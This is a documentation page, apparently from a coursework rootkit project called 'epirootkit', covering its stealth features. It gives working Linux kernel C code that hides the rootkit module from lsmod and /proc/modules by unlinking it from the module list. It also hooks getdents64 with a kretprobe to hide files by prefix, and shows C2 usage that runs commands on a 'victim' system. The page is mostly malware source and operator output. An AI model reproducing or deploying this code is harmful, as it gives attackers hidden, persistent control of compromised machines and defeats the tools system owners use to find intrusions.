---
title: "Stealth & Hiding"
description: "Module hiding and file hiding capabilities"
icon: "visibility_off"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 512
---

# Stealth & Hiding

Hide the rootkit module and files from system detection using kernel hooking techniques.

## What We Implemented

### Module Hiding
- **Hide from `lsmod`**: Remove module from kernel module list
- **Hide from `/proc/modules`**: Module not visible in procfs
- **Dynamic control**: Toggle visibility via C2 commands

### File Hiding
- **Hide by prefix**: Files with specific prefixes are hidden
- **Directory listing**: Intercept `getdents64` syscall
- **Automatic hiding**: Enabled by default when module loads

## Module Hiding

### How It Works
1. **Find module**: Locate rootkit in kernel module list
2. **Remove from list**: Use `list_del()` to remove from `modules` list
3. **Store reference**: Keep pointer to restore later
4. **Toggle visibility**: Can hide/unhide dynamically

### Implementation
```c
int hide_module(void)
{
    struct module *mod;
    
    mutex_lock(&module_mutex);
    list_for_each_entry(mod, &modules, list) {
        if (mod == THIS_MODULE) {
            stealth_state.prev_module_entry = mod->list.prev;
            list_del(&mod->list);
            stealth_state.module_hidden = true;
            break;
        }
    }
    mutex_unlock(&module_mutex);
    return 0;
}
```

### Usage
```bash
# Hide the module
c2-server$ config Client-1
# Select: Toggle Module Hiding
# ✓ Module hidden

# Verify hiding (from victim system)
victim$ lsmod | grep epirootkit
# (no output - module is hidden)

# Check status
c2-server$ status Client-1
# Module Hidden: YES
```

### Detection Evasion
- **`lsmod` command**: Module not listed
- **`/proc/modules`**: Entry removed from procfs
- **System monitoring**: Most tools rely on these sources

## File Hiding

### How It Works
1. **Hook `getdents64`**: Use kretprobe to intercept directory listings
2. **Filter entries**: Remove files with configured prefixes
3. **Modify buffer**: Adjust directory entry buffer
4. **Return filtered**: Send modified listing to userspace

### Hidden File Prefixes
Files starting with these prefixes are automatically hidden:
```c
static const char * const hide_prefixes[] = { 
    "epirootkit",
    "jules_est_bo_", 
    "memfd:",
    ".hidden_",
};
```

### Implementation
```c
static int getdents64_ret_handler(struct kretprobe_instance *ri, 
                                 struct pt_regs *regs)
{
    struct getdents_context *ctx = (struct getdents_context *)ri->data;
    const long ret_value = regs_return_value(regs);
    char *kernel_buffer;
    long filtered_size;

    // Copy user buffer to kernel space for filtering
    kernel_buffer = kmalloc(ret_value, GFP_ATOMIC);
    if (copy_from_user(kernel_buffer, ctx->user_buffer, ret_value) == 0) {
        filtered_size = filter_directory_entries(kernel_buffer, ret_value);
        if (filtered_size != ret_value) {
            copy_to_user(ctx->user_buffer, kernel_buffer, filtered_size);
            regs_set_return_value(regs, filtered_size);
        }
    }

    kfree(kernel_buffer);
    return 0;
}
```

### Examples of Hidden Files
```bash
# These files are hidden from 'ls' output:
/tmp/epirootkit_temp
/var/log/epirootkit.log
/home/user/epirootkit_config
/tmp/jules_est_bo_secret
/tmp/.hidden_file
/tmp/memfd:something
```

### Testing File Hiding
```bash
# Create test files
c2-server$ exec Client-1 touch /tmp/epirootkit_test
c2-server$ exec Client-1 touch /tmp/normal_file

# List directory (file hiding active)
c2-server$ exec Client-1 ls -la /tmp/
# Only shows: normal_file (epirootkit_test is hidden)

# Files still exist and accessible
c2-server$ exec Client-1 cat /tmp/epirootkit_test
# Works fine - file exists but hidden from listings
```

## Dynamic Control

### Interactive Configuration
```bash
c2-server$ config Client-1
# ┌─ Configuration - Client-1
#   Current Configuration:
#   [X] Module Hiding (Click to disable)
#   
# ? Select option: [Use arrow keys]
#   ❯ [X] Module Hiding (Click to disable)
#     Refresh Status
#     Exit
```

## Technical Details

### Syscall Hooking
- **Method**: kretprobe on `getdents64` syscall
- **Kernel version**: Compatible with Linux 5.4.0
- **Memory safety**: GFP_ATOMIC allocations with 4KB limit
- **Error handling**: Graceful fallback on allocation failures

### Module List Manipulation
- **Mutex protection**: Uses `module_mutex` for thread safety
- **List operations**: Standard kernel `list_del()` and `list_add()`
- **State tracking**: Maintains hiding state in global structure



### Customize Hidden Prefixes
Edit the `hide_prefixes` array in `stealth.c` to change which files are hidden.